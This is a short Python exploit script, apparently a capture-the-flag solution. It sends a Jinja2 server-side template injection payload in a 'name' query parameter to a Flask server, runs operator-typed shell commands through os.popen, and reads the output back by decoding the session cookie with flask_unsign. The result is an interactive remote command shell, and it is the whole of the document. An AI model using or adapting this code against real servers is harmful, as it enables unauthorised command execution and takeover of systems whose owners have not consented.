import requests
import flask_unsign

Server = input("Server addr: ")
if requests.get(Server).status_code == 200:
    while True:
        cmd = input ("Command: ")
        if cmd == "exit":
            exit()
        sess = requests.Session()
        sess.get(Server+"/?name={%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=asdf&os=os&command="+cmd)
        session = sess.cookies.get_dict()['session']
        print(flask_unsign.decode(str(session))['asdf'].decode())